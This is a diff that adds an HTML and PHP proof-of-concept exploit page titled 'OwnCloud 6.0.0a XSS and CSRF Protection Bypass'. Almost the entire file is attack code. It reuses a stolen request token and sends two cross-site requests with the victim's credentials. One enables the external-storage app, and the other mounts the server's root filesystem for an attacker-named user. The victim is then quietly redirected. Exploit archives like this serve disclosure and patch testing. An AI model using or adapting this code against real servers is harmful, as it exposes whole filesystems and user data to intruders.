@@ -1,0 +1,70 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>OwnCloud 6.0.0a XSS and CSRF Protection Bypass</title>
+        <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+</head>
+<body>
+    <span id="container"></span>
+        <form id="form1">
+                <input type="hidden" name="mountPoint" value="LOL">
+                <input type="hidden" name="class" value="\OC\Files\Storage\Local">
+                <input type="hidden" name="classOptions[datadir]" value="/">
+                <input type="hidden" name="mountType" value="user">
+                <input type="hidden" name="applicable" value="[ATTACKER]">
+                <input type="hidden" name="isPersonal" value="false">
+                <?php echo '<input type="hidden" name="requesttoken" value="'.$_GET["rt"].'">' ?>
+        </form>
+    <script>
+        $('#form1').submit(function(event) {
+                event.preventDefault();
+                $.ajax({
+                        type: 'POST',
+                        url: 'Target',
+                        data: $(this).serialize(),
+                xhrFields: {
+                 withCredentials: true
+                },
+                        dataType: 'json',
+                });
+        });
+        </script>
+ 
+        <form id="form2">
+                <input type="hidden" name="appid" value="files_external">
+                <?php echo '<input type="hidden" name="requesttoken" value="'.$_GET["rt"].'">' ?>
+        </form>
+    <script>
+        $('#form2').submit(function(event) {
+                event.preventDefault();
+                $.ajax({
+                        type: 'POST',
+                        url: 'Target',
+                        data: $(this).serialize(),
+                xhrFields: {
+                 withCredentials: true
+                },
+                        dataType: 'json',
+                });
+        });
+ 
+    function ext() {
+        $('#form2').submit();
+        $("#container").text("Enabling External Storage..."); 
+    };
+    function mount() {
+        $('#form1').submit();
+        $("#container").text("Mounting the root filesystem...");
+    };
+    function redirect() {
+        window.location.href = 'Target';
+        $("#container").text("Redirecting back home ;)");
+    };
+    setTimeout(function() {ext();}, 0);
+    setTimeout(function() {mount();}, 5000);
+    setTimeout(function() {redirect();}, 5500);
+    </script>
+</body>
+</html>
+ 
